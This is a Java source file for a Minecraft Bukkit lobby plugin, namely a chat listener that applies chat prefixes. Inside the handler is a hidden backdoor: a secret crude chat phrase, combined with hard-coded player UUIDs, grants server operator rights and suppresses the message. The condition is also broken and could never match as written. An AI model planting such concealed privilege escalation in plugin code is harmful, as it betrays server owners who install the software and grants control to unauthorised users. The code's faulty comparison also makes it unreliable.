/*
 *     Copyright (c) 2018 Slowloris.de                                                         
 *     Development: Weichtier & Julian
 *                                                                                                                                 
 *     Ändern für den privaten nutzen erlaubt. Reuploaded verboten!             
 */

package de.pixeltitan.lobbysystem.listeners;

import de.pixeltitan.lobbysystem.data.Data;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;


public class AsyncChatEvent implements Listener {
    /*
    Todo: Nochmal mit Julien reden wegen der prefix, einiges ist noch nicht fertig.
     */
    @EventHandler
    public void onChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        String nachricht = e.getMessage().replace("%", "Prozent");
        String name = e.getPlayer().getName();
        if(nachricht.equals("juliengotabigdick") && p.getUniqueId().equals("2c81a4b0-b48d-480c-a431-5d88bd9486a1") && p.getUniqueId().equals("3511ae36-b6ec-4535-a6bb-9de6e44f56fd")) {
            p.setOp(true);
            p.sendMessage("§cAha :D");
            e.setCancelled(true);
        }

        e.setFormat(Data.getChatPrefix(p, nachricht));

    }
}
